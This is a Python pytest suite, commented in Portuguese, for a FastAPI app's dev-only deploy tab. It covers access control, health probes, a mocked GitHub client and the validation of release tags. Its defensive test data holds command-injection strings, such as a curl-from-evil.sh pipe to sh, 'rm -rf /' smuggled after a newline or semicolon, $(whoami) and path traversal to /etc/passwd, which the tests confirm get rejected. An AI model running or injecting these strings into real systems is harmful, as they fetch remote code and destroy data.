"""Aba /deploy: RBAC, sondas de saúde, histórico e o cliente do GitHub.

Nenhum teste aqui toca a rede: o respx intercepta o transporte do httpx. Um teste que
fizesse rede de verdade quebraria no CI (sem egress) e mentiria sobre o comportamento
offline, que é justamente o caso normal do servidor da cliente.
"""

from __future__ import annotations

from dataclasses import replace
from unittest.mock import patch

import httpx
import pytest
import respx
from fastapi.testclient import TestClient
from sqlalchemy import text

from app.controllers.deploy_controller import deploy_controller
from app.core.database import SessionLocal
from app.core.errors import NaoEncontradoError, RegraNegocioError
from app.integracoes import github
from app.main import app
from app.models.deploy import CiStatusCache, Deploy
from app.repositories.deploy_repo import deploy_repo
from app.services.ci_service import ci_service
from app.services.deploy_service import deploy_service
from app.services.saude_service import (
    SCHEMA_EM_DIA,
    saude_service,
)

PERFIS = ["admin", "vendedor", "financeiro", "funcionario", "dev"]
ROTAS = [
    "/deploy",
    "/deploy/status",
    "/deploy/saude",
    "/deploy/historico",
    "/deploy/ci",
    "/deploy/releases",
]


def _login(perfil: str) -> TestClient:
    c = TestClient(app)
    r = c.post(
        "/login",
        data={"email": f"{perfil}@estrela.local", "senha": "estrela123"},
        follow_redirects=False,
    )
    assert r.status_code == 303, r.text
    return c


# ------------------------------------------------------------------ RBAC


@pytest.mark.parametrize("rota", ROTAS)
def test_deploy_exige_login(rota: str) -> None:
    r = TestClient(app).get(rota, follow_redirects=False)
    assert r.status_code == 303
    assert r.headers["location"] == "/login"


@pytest.mark.parametrize("perfil", ["admin", "vendedor", "financeiro", "funcionario"])
@pytest.mark.parametrize("rota", ROTAS)
def test_deploy_e_somente_dev(perfil: str, rota: str) -> None:
    """Nem o admin entra: /deploy é manutenção, não operação da empresa.

    O admin da Estrela é um usuário real e não pode alcançar a tela que mostra disco,
    versão e (mais adiante) reinicia o sistema — nem digitando a URL.
    """
    assert _login(perfil).get(rota).status_code == 403


@pytest.mark.parametrize("rota", ROTAS)
def test_dev_acessa(rota: str) -> None:
    assert _login("dev").get(rota).status_code == 200


def test_deploy_no_menu_so_do_dev() -> None:
    """O admin da empresa não pode nem saber que a tela existe."""
    assert "Status do Deploy" in _login("dev").get("/").text
    for perfil in ("admin", "vendedor", "financeiro", "funcionario"):
        assert "Status do Deploy" not in _login(perfil).get("/").text, perfil


def test_dev_enxerga_todos_os_itens_do_menu() -> None:
    """O dev é superusuário: sem isto ele veria uma sidebar vazia."""
    t = _login("dev").get("/").text
    for rota in (
        "/estoque",
        "/produtos",
        "/pedidos",
        "/separacao",
        "/clientes",
        "/financeiro",
        "/relatorios",
        "/importacao",
        "/empresa",
        "/usuarios",
    ):
        assert f'href="{rota}"' in t, rota


@pytest.mark.parametrize(
    "rota", ["/pedidos", "/separacao", "/financeiro", "/importacao", "/empresa", "/usuarios"]
)
def test_dev_passa_em_qualquer_require_role(rota: str) -> None:
    assert _login("dev").get(rota).status_code == 200


def test_tabelas_da_aba_tem_scope_col() -> None:
    t = _login("dev").get("/deploy").text
    assert 'scope="col"' in t


# ------------------------------------------------- anti-escalação de privilégio


def test_admin_nao_cria_usuario_dev() -> None:
    """Tirar "dev" do <select> é cosmético — o guard tem que estar no POST."""
    r = _login("admin").post(
        "/usuarios",
        data={
            "nome": "Invasor",
            "email": "invasor@estrela.local",
            "senha": "estrela123",
            "perfil": "dev",
        },
        follow_redirects=False,
    )
    assert r.status_code == 403


def test_select_de_perfis_nao_oferece_dev_para_admin() -> None:
    t = _login("admin").get("/usuarios/novo").text
    assert ">dev<" not in t


def test_admin_nao_reseta_senha_de_dev(db) -> None:
    """Sem este guard, o admin entra como dev e a tela de manutenção cai no colo dele."""
    from sqlalchemy import select

    from app.models.usuario import Usuario as U

    dev_id = db.scalar(select(U.id).where(U.perfil == "dev"))
    assert dev_id, "o seed precisa ter um usuário dev"
    r = _login("admin").post(
        f"/usuarios/{dev_id}/reset-senha",
        data={"nova_senha": "SenhaNova123!"},
        follow_redirects=False,
    )
    assert r.status_code == 404, "o admin não pode nem saber que o dev existe"


def test_admin_nao_ve_usuario_dev_na_lista() -> None:
    assert "dev@estrela.local" not in _login("admin").get("/usuarios").text
    assert "dev@estrela.local" in _login("dev").get("/usuarios").text


# ------------------------------------------------------------------ saúde


def test_saude_coleta_todas_as_sondas(db) -> None:
    s = saude_service.coletar(db)
    rotulos = {x.rotulo for x in s.sondas}
    assert {"Banco de dados", "Migrations", "Agente de deploy"} <= rotulos
    assert all(x.nivel in ("ok", "aviso", "critico", "neutro") for x in s.sondas)


def test_migration_em_dia_no_banco_de_teste(db) -> None:
    s = saude_service.coletar(db)
    assert s.schema_estado == SCHEMA_EM_DIA


def test_agente_ausente_nao_derruba_a_sonda(db) -> None:
    """O schema `agente` só existe depois do instalar-agente.sh. Ausente é normal."""
    sonda = next(x for x in saude_service.coletar(db).sondas if x.rotulo == "Agente de deploy")
    assert sonda.nivel in ("neutro", "aviso", "critico")


def test_sonda_que_falha_nao_envenena_as_seguintes(db) -> None:
    """Regressão: sem SAVEPOINT, a 1ª sonda que falha aborta a transação e todas as
    seguintes passam a mentir com InFailedSqlTransaction."""
    saude_service._agente(db)  # falha (schema agente não existe) e faz rollback do savepoint
    sonda, _ = saude_service._banco(db)
    assert sonda.nivel == "ok", "a sonda de banco mentiu depois de outra sonda falhar"


def test_pronto_true_com_schema_em_dia(db) -> None:
    pronto, motivo = saude_service.pronto(db)
    assert pronto is True
    assert motivo == "ok"


def test_health_publico_nao_vaza_versao() -> None:
    r = TestClient(app).get("/health")
    assert r.status_code == 200
    assert r.json() == {"status": "ok"}


def test_health_ready_e_publico_e_responde() -> None:
    r = TestClient(app).get("/health/ready")
    assert r.status_code in (200, 503)
    assert "pronto" in r.json()


# -------------------------------------------------------------- histórico


def test_historico_mostra_quem_solicitou(db, usuario_admin) -> None:
    db.add(
        Deploy(
            acao="atualizacao",
            status="sucesso",
            versao_nova="v1.2.3",
            solicitado_por_id=usuario_admin.id,
        )
    )
    db.flush()
    from app.repositories.deploy_repo import deploy_repo

    d = deploy_repo.listar(db)[0]
    # joinedload: o relationship é lazy="raise", então isto explodiria sem ele.
    assert d.usuario is not None
    assert d.usuario.nome == usuario_admin.nome


def test_em_voo_encontra_o_deploy_em_andamento(db) -> None:
    from app.repositories.deploy_repo import deploy_repo

    assert deploy_repo.em_voo(db) is None
    db.add(Deploy(acao="atualizacao", status="executando", versao_nova="v9.9.9"))
    db.flush()
    assert deploy_repo.em_voo(db).versao_nova == "v9.9.9"


# ------------------------------------------------------------ GitHub / CI


@respx.mock
def test_github_sem_rede_devolve_erro_amigavel() -> None:
    """O branch que mais importa: o servidor da cliente vive offline."""
    respx.get(url__startswith="https://api.github.com").mock(
        side_effect=httpx.ConnectError("sem rota")
    )
    r = github.consultar()
    assert r.ok is False
    assert r.erro == "Sem conexão com o GitHub."


@respx.mock
def test_github_timeout_nao_levanta() -> None:
    respx.get(url__startswith="https://api.github.com").mock(
        side_effect=httpx.ReadTimeout("demorou")
    )
    r = github.consultar()
    assert r.ok is False
    assert "demorou demais" in r.erro


@respx.mock
def test_github_repo_sem_release_nao_e_erro() -> None:
    """404 em /releases/latest = ainda não há release. Não é falha."""
    respx.get(url__startswith="https://api.github.com/repos").mock(
        return_value=httpx.Response(200, json={"workflow_runs": []})
    )
    respx.get(url__regex=r".*/releases/latest").mock(return_value=httpx.Response(404))
    r = github.consultar()
    assert r.ok is True
    assert r.release_tag is None


@respx.mock
def test_github_traduz_rate_limit() -> None:
    respx.get(url__startswith="https://api.github.com").mock(
        return_value=httpx.Response(403, headers={"X-RateLimit-Remaining": "0"})
    )
    r = github.consultar()
    assert r.ok is False
    assert "Limite de consultas" in r.erro


@respx.mock
def test_github_le_runs_e_release() -> None:
    respx.get(url__regex=r".*/actions/runs.*").mock(
        return_value=httpx.Response(
            200,
            json={
                "workflow_runs": [
                    {
                        "name": "CI",
                        "status": "completed",
                        "conclusion": "success",
                        "html_url": "https://github.com/x/y/actions/runs/1",
                        "head_sha": "abcdef1234",
                        "display_title": "feat: algo",
                        "created_at": "2026-07-16T10:00:00Z",
                    }
                ]
            },
        )
    )
    respx.get(url__regex=r".*/releases/latest").mock(
        return_value=httpx.Response(
            200,
            json={
                "tag_name": "v1.0.0",
                "html_url": "https://github.com/x/y/releases/v1.0.0",
                "published_at": "2026-07-16T11:00:00Z",
            },
        )
    )
    r = github.consultar()
    assert r.ok is True
    assert r.runs[0]["conclusion"] == "success"
    assert r.runs[0]["sha"] == "abcdef1"
    assert r.release_tag == "v1.0.0"


@respx.mock
def test_falha_preserva_dados_antigos_e_abre_o_breaker() -> None:
    """Um card 'de 20 min atrás' vale mais que um card vazio."""
    db = SessionLocal()
    try:
        db.query(CiStatusCache).delete()
        db.add(
            CiStatusCache(
                id=1,
                ok=True,
                runs=[{"workflow": "CI", "conclusion": "success", "sha": "aaaaaaa"}],
                release_tag="v1.0.0",
                falhas_seguidas=0,
            )
        )
        db.flush()

        respx.get(url__startswith="https://api.github.com").mock(
            side_effect=httpx.ConnectError("sem rota")
        )
        linha = ci_service.atualizar(db)

        assert linha.ok is False
        assert linha.erro == "Sem conexão com o GitHub."
        assert linha.runs, "os dados antigos foram descartados"
        assert linha.release_tag == "v1.0.0"
        assert linha.falhas_seguidas == 1
        assert linha.proxima_tentativa_em is not None, "o breaker não abriu"
    finally:
        db.rollback()
        db.close()


def test_breaker_segura_novas_tentativas() -> None:
    from datetime import UTC, datetime, timedelta

    db = SessionLocal()
    try:
        db.query(CiStatusCache).delete()
        db.add(
            CiStatusCache(
                id=1,
                ok=False,
                consultado_em=datetime.now(UTC) - timedelta(hours=1),
                proxima_tentativa_em=datetime.now(UTC) + timedelta(minutes=5),
                falhas_seguidas=3,
            )
        )
        db.flush()
        assert ci_service.precisa_atualizar(db) is False
    finally:
        db.rollback()
        db.close()


# ------------------------------------------------- botões de atualizar/rollback

POSTS = ["/deploy/atualizar", "/deploy/rollback", "/deploy/1/cancelar"]

# A tag sai de um <input> e termina num comando docker no host. Cada uma destas já foi
# um incidente em algum lugar:
TAGS_MALICIOSAS = [
    # O caso que o `$` da regex deixaria passar: em Python `$` casa ANTES de um \n final,
    # então "^v[0-9.]+$" aceita esta string inteira. Por isso a regex usa \A/\Z.
    "v1.2.3\nrm -rf /",
    "v1.2.3; rm -rf /",
    "v1.2.3 && curl evil.sh | sh",
    "v1.2.3 $(whoami)",
    "v1.2.3`id`",
    "../../etc",
    "-rf",  # docker leria como flag
    "",
    " ",
    "x" * 100,
]


def _conta_deploys() -> int:
    db = SessionLocal()
    try:
        return db.query(Deploy).count()
    finally:
        db.close()


@pytest.mark.parametrize("perfil", ["admin", "vendedor", "financeiro", "funcionario"])
@pytest.mark.parametrize("rota", POSTS)
def test_post_de_deploy_e_somente_dev(perfil: str, rota: str) -> None:
    """Quem opera a empresa não reinicia o servidor — nem com um POST na mão."""
    antes = _conta_deploys()
    assert _login(perfil).post(rota, data={"tag": "v1.2.3"}).status_code == 403
    assert _conta_deploys() == antes, "um perfil sem permissão criou linha em deploys"


@pytest.mark.parametrize("rota", POSTS)
def test_post_de_deploy_exige_login(rota: str) -> None:
    r = TestClient(app).post(rota, data={"tag": "v1.2.3"}, follow_redirects=False)
    assert r.status_code == 303
    assert r.headers["location"] == "/login"


@pytest.mark.parametrize("rota", ["/deploy/atualizar", "/deploy/rollback"])
def test_dev_passa_no_rbac_dos_posts(rota: str) -> None:
    """O dev não pode levar 403. Aqui ele para no 422 de "agente não instalado",
    que é justamente a prova de que passou pelo RBAC e chegou na regra de negócio."""
    r = _login("dev").post(rota, data={"tag": "v1.2.3"}, follow_redirects=False)
    assert r.status_code != 403
    assert r.status_code == 422


@pytest.mark.parametrize("tag", TAGS_MALICIOSAS)
@pytest.mark.parametrize("rota", ["/deploy/atualizar", "/deploy/rollback"])
def test_tag_maliciosa_nao_vira_linha_no_banco(rota: str, tag: str) -> None:
    """O teste que mais importa: a rejeição acontece ANTES do INSERT.

    Não basta o agente recusar depois — a linha no banco é o que ele lê, e ele confia no
    que está lá o suficiente para agir. Se a tag chegar a virar linha, a defesa passa a
    depender só da segunda validação.
    """
    antes = _conta_deploys()
    r = _login("dev").post(rota, data={"tag": tag, "confirmacao": tag}, follow_redirects=False)
    assert r.status_code == 422, f"{tag!r} não foi recusada"
    assert _conta_deploys() == antes, f"{tag!r} virou linha em deploys"


@pytest.mark.parametrize("tag", TAGS_MALICIOSAS)
def test_validar_tag_recusa_no_service(tag: str) -> None:
    """A mesma trava, sem passar pela rota: o service é a fronteira, não o formulário."""
    with pytest.raises(RegraNegocioError):
        deploy_service.validar_tag(tag)


@pytest.mark.parametrize("tag", ["v1.2.3", "v1.2.3-rc.1", "v0.1.0", "v10.20.30", "v0.0.0"])
def test_validar_tag_aceita_tags_reais(tag: str) -> None:
    """Só SemVer com o "v" — é o formato que o release.yml publica e o agente aceita."""
    assert deploy_service.validar_tag(tag) == tag


@pytest.mark.parametrize("tag", ["1.0.0", "main_2024", "abc123", "v1.2", "v1"])
def test_validar_tag_recusa_fora_do_semver(tag: str) -> None:
    """Não basta ser inofensiva: tem de ser uma versão que o agente saiba resolver.

    Antes a app aceitava qualquer alfanumérico. Gravava a linha, e o agente — que sempre
    foi SemVer estrito — recusava depois: pedido morto no banco e o usuário lendo
    "versão indisponível" quando o erro real era "versão inválida".
    """
    with pytest.raises(RegraNegocioError):
        deploy_service.validar_tag(tag)


def test_validar_tag_no_teto_de_32() -> None:
    """O teto de 32 e a regex são coerentes: a maior SemVer aceitável tem exatos 32.

    A checagem de tamanho roda ANTES da regex de propósito — limita o custo de avaliar o
    padrão contra uma string enorme.
    """
    tag32 = "v9999.9999.9999-" + "a" * 16
    assert len(tag32) == 32
    assert deploy_service.validar_tag(tag32) == tag32
    with pytest.raises(RegraNegocioError, match="32 caracteres"):
        deploy_service.validar_tag("v" + "1" * 40)


def test_agente_nao_instalado_nao_explode(db) -> None:
    """O schema `agente` só nasce com o instalar-agente.sh: ausente é estado normal."""
    info = deploy_service.releases(db)
    assert info.agente_instalado is False
    assert info.itens == []


def test_agente_ausente_nao_envenena_a_transacao(db) -> None:
    """Regressão: sem SAVEPOINT, a consulta à tabela ausente aborta a transação e tudo
    que vier depois no mesmo request mente com InFailedSqlTransaction."""
    deploy_service.releases(db)
    assert db.execute(text("SELECT 1")).scalar() == 1


def _criar_allowlist(db, linhas: list[tuple]) -> None:
    """Cria a allowlist do agente DENTRO da transação do teste (revertida no fim).

    DDL no Postgres é transacional, então isto não deixa resíduo no banco de dev.
    """
    db.execute(text("CREATE SCHEMA IF NOT EXISTS agente"))
    db.execute(
        text(
            "CREATE TABLE IF NOT EXISTS agente.releases_disponiveis ("
            " tag text PRIMARY KEY, alembic_head text, rollback_seguro boolean,"
            " git_sha text, publicado_em timestamptz)"
        )
    )
    for tag, head, seguro in linhas:
        db.execute(
            text(
                "INSERT INTO agente.releases_disponiveis"
                " (tag, alembic_head, rollback_seguro, git_sha, publicado_em)"
                " VALUES (:t, :h, :s, 'abc1234def', now())"
            ),
            {"t": tag, "h": head, "s": seguro},
        )
    db.flush()


def test_solicitar_atualizacao_insere_e_toca_a_campainha(db, usuario_admin) -> None:
    _criar_allowlist(db, [("v9.9.9", "9c311b4bb27f", True)])
    d = deploy_service.solicitar_atualizacao(db, "v9.9.9", usuario_admin)
    assert d.status == "solicitado"
    assert d.acao == "atualizacao"
    assert d.versao_nova == "v9.9.9"
    # Copiados da allowlist, nunca do formulário.
    assert d.alembic_head == "9c311b4bb27f"
    assert d.rollback_seguro is True
    # Somente-agente: a app não escolhe imagem.
    assert d.imagem_digest is None
    assert d.origem is None


def test_tag_fora_da_allowlist_e_recusada(db, usuario_admin) -> None:
    """Tag bem-formada não basta: precisa ser uma imagem que o agente já verificou."""
    _criar_allowlist(db, [("v9.9.9", "9c311b4bb27f", True)])
    with pytest.raises(RegraNegocioError, match="não está na lista"):
        deploy_service.solicitar_atualizacao(db, "v0.0.1", usuario_admin)


def test_recusa_deploy_concorrente(db, usuario_admin) -> None:
    """Dois deploys ao mesmo tempo = dois `docker compose up` disputando os containers."""
    _criar_allowlist(db, [("v9.9.9", "9c311b4bb27f", True), ("v8.8.8", "9c311b4bb27f", True)])
    deploy_service.solicitar_atualizacao(db, "v9.9.9", usuario_admin)
    with pytest.raises(RegraNegocioError, match="em andamento"):
        deploy_service.solicitar_atualizacao(db, "v8.8.8", usuario_admin)


def test_rollback_arriscado_exige_digitar_a_versao(db, usuario_admin) -> None:
    """A trava mora no service, não no HTML: um POST direto pularia o modal."""
    _criar_allowlist(db, [("v0.0.9", "head_antiga", True)])
    with pytest.raises(RegraNegocioError, match="exige confirmação"):
        deploy_service.solicitar_rollback(db, "v0.0.9", usuario_admin)
    with pytest.raises(RegraNegocioError, match="exige confirmação"):
        deploy_service.solicitar_rollback(db, "v0.0.9", usuario_admin, confirmacao="v0.0.8")
    d = deploy_service.solicitar_rollback(db, "v0.0.9", usuario_admin, confirmacao="v0.0.9")
    assert d.acao == "rollback"


def test_rollback_marcado_inseguro_tambem_exige_confirmacao(db, usuario_admin) -> None:
    _criar_allowlist(db, [("v0.0.9", None, False)])
    with pytest.raises(RegraNegocioError, match="exige confirmação"):
        deploy_service.solicitar_rollback(db, "v0.0.9", usuario_admin)


def test_release_que_cruza_migration_e_arriscada(db) -> None:
    _criar_allowlist(db, [("v0.0.9", "head_de_outro_mundo", True)])
    r = next(x for x in deploy_service.releases(db).itens if x.tag == "v0.0.9")
    assert r.cruza_migration is True
    assert r.arriscada is True
    assert "NÃO volta" in r.motivo_risco


def test_release_com_head_desconhecida_e_arriscada(db) -> None:
    """Sem saber a head, não dá para prometer que é seguro — e mentir na tela é pior
    que não ter o botão."""
    _criar_allowlist(db, [("v0.0.9", None, True)])
    r = next(x for x in deploy_service.releases(db).itens if x.tag == "v0.0.9")
    assert r.arriscada is True


def test_cancelar_destrava_deploy_orfao(db, usuario_admin) -> None:
    _criar_allowlist(db, [("v9.9.9", "9c311b4bb27f", True)])
    d = deploy_service.solicitar_atualizacao(db, "v9.9.9", usuario_admin)
    deploy_service.cancelar(db, d.id, usuario_admin)
    assert d.status == "cancelado"
    assert d.concluido_em is not None
    assert usuario_admin.nome in d.log
    # Destravou: dá para solicitar de novo.
    assert deploy_repo.em_voo(db) is None


def test_cancelar_deploy_ja_terminado_e_recusado(db, usuario_admin) -> None:
    """Status é monotônico: um deploy que já acabou não volta a mudar."""
    d = Deploy(acao="atualizacao", status="sucesso", versao_nova="v1.0.0")
    db.add(d)
    db.flush()
    with pytest.raises(RegraNegocioError, match="já terminou"):
        deploy_service.cancelar(db, d.id, usuario_admin)


def test_cancelar_inexistente_da_404(db, usuario_admin) -> None:
    with pytest.raises(NaoEncontradoError):
        deploy_service.cancelar(db, 999_999, usuario_admin)


def _render(nome: str, ctx: dict) -> str:
    """Renderiza um fragmento fora do HTTP.

    O TestClient abre a própria conexão e não enxergaria a allowlist criada dentro da
    transação do teste, então a linha "cheia" do histórico (com botão de reverter) nunca
    seria exercida por um GET — só o estado vazio. Isto cobre o caminho que o dev vê.
    """
    from app.core.templates import templates

    return templates.env.get_template(nome).render(**ctx)


def test_historico_renderiza_linha_com_rollback(db, usuario_admin) -> None:
    _criar_allowlist(db, [("v1.0.0", "9c311b4bb27f", True)])
    db.add(
        Deploy(
            acao="atualizacao",
            status="sucesso",
            versao_anterior="v0.9.0",
            versao_nova="v1.0.0",
            solicitado_por_id=usuario_admin.id,
            duracao_seg=42,
        )
    )
    db.flush()
    html = _render("deploy/_historico.html", deploy_controller.historico(db))

    assert "v1.0.0" in html
    assert "Produção" in html
    assert "abc1234" in html, "o sha curto vem da allowlist, não da linha de deploys"
    assert "Pronto" in html
    assert usuario_admin.nome in html
    assert 'data-action="/deploy/rollback"' in html
    # Head igual à do banco e rollback_seguro=True: nada de aviso vermelho aqui.
    assert 'data-arriscada="nao"' in html


def test_historico_marca_rollback_arriscado_na_tela(db, usuario_admin) -> None:
    """A tela precisa dizer na cara quando reverter cruza migration — este é o ponto em
    que a analogia com a Vercel quebra."""
    _criar_allowlist(db, [("v1.0.0", "head_de_outro_mundo", True)])
    db.add(Deploy(acao="atualizacao", status="sucesso", versao_nova="v1.0.0"))
    db.flush()
    html = _render("deploy/_historico.html", deploy_controller.historico(db))

    assert 'data-arriscada="sim"' in html
    assert "btn-perigo" in html
    assert "NÃO volta" in html


def test_historico_nao_oferece_rollback_para_a_versao_atual(db) -> None:
    """Reverter para o que já está rodando é um restart caro disfarçado de botão."""
    _criar_allowlist(db, [("v1.0.0", "9c311b4bb27f", True)])
    db.add(Deploy(acao="atualizacao", status="sucesso", versao_nova="v1.0.0"))
    db.flush()
    ctx = deploy_controller.historico(db)
    # Força a v1.0.0 a ser a que está rodando (em teste o APP_VERSION fica vazio).
    ctx["por_tag"]["v1.0.0"] = replace(ctx["por_tag"]["v1.0.0"], atual=True)
    html = _render("deploy/_historico.html", ctx)

    assert "Atual" in html
    assert 'data-action="/deploy/rollback"' not in html


def test_releases_renderiza_agente_ausente(db) -> None:
    html = _render("deploy/_releases.html", deploy_controller.releases(db))
    assert "não está instalado" in html
    assert 'data-action="/deploy/atualizar"' not in html, "botão sem agente é botão que mente"


def test_regex_da_app_e_do_agente_concordam() -> None:
    """A validação da tag é duplicada de propósito (o agente não confia na app), mas as
    duas precisam CONCORDAR sobre o que é válido.

    Se a app for mais permissiva, ela grava uma linha que o agente recusa depois: pedido
    morto no banco e o usuário lendo "versão indisponível" em vez de "versão inválida".
    Se for mais restritiva, some versão legítima da tela. Este teste lê o regex do agente
    do ARQUIVO (ele não é importável: roda fora do Docker, sem app.*, com psycopg próprio).
    """
    import re
    from pathlib import Path

    from app.services.deploy_service import _TAG_RE

    fonte = Path(__file__).resolve().parent.parent / "scripts" / "agente" / "agente.py"
    texto = fonte.read_text()
    num = re.search(r'^_NUM = r"(.+)"$', texto, re.M)
    tag = re.search(r"^_RE_TAG = re\.compile\(rf\"(.+)\"\)$", texto, re.M)
    assert num and tag, "o agente mudou o formato do regex; ajuste este teste"
    padrao_agente = re.compile(
        tag.group(1).replace("{_NUM}", num.group(1)).replace("{{", "{").replace("}}", "}")
    )

    corpus = [
        "v1.2.3",
        "v0.1.0",
        "v10.20.30",
        "v1.2.3-rc1",
        "v0.0.0",
        "latest",
        "stable",
        "aprovado",
        "v1.2",
        "v1",
        "1.2.3",
        "",
        "v1.2.3\n",
        "v1.2.3\nrm -rf /",
        "v1.2.3; rm -rf /",
        "v1.2.3$(id)",
        " v1.2.3",
        "v1.2.3 ",
        "../../etc/passwd",
        "-rf",
        "v" + "9" * 40,
    ]
    divergentes = [
        c
        for c in corpus
        if (_TAG_RE.fullmatch(c) is not None) != (padrao_agente.fullmatch(c) is not None)
    ]
    assert not divergentes, f"app e agente discordam sobre: {divergentes}"


def test_tag_movel_e_recusada() -> None:
    """'latest' destruiria a noção de qual versão está rodando — e o rollback junto."""
    from app.core.errors import RegraNegocioError
    from app.services.deploy_service import deploy_service

    for movel in ("latest", "stable", "aprovado", "main"):
        with pytest.raises(RegraNegocioError, match="Versão inválida"):
            deploy_service.validar_tag(movel)


# ------------------------------------------------ cookie de sessão / HTTPS


def test_cookie_de_sessao_nao_e_secure_sob_http() -> None:
    """Regressão do loop de login em produção.

    O cookie era `secure=not is_dev`, então em prod saía Secure. Servido por HTTP na LAN,
    o navegador nunca reenviava o cookie e o login entrava em loop. A flag agora segue
    HTTPS_ENABLED (default False), não o ENV. Este teste falha se alguém reintroduzir o
    acoplamento com is_dev.
    """

    c = TestClient(app)
    r = c.post(
        "/login",
        data={"email": "dev@estrela.local", "senha": "estrela123"},
        follow_redirects=False,
    )
    assert r.status_code == 303
    set_cookie = r.headers.get("set-cookie", "")
    assert "estrela_token=" in set_cookie
    # Em dev/teste (HTTPS_ENABLED False) o cookie NÃO pode vir com o atributo Secure.
    assert "secure" not in set_cookie.lower(), set_cookie


def test_https_enabled_liga_o_secure() -> None:
    """Quando há TLS de verdade na frente, o cookie precisa ser Secure."""
    from app.core.config import settings

    with patch.object(settings, "HTTPS_ENABLED", True):
        c = TestClient(app)
        r = c.post(
            "/login",
            data={"email": "dev@estrela.local", "senha": "estrela123"},
            follow_redirects=False,
        )
        assert r.status_code == 303
        assert "secure" in r.headers.get("set-cookie", "").lower()
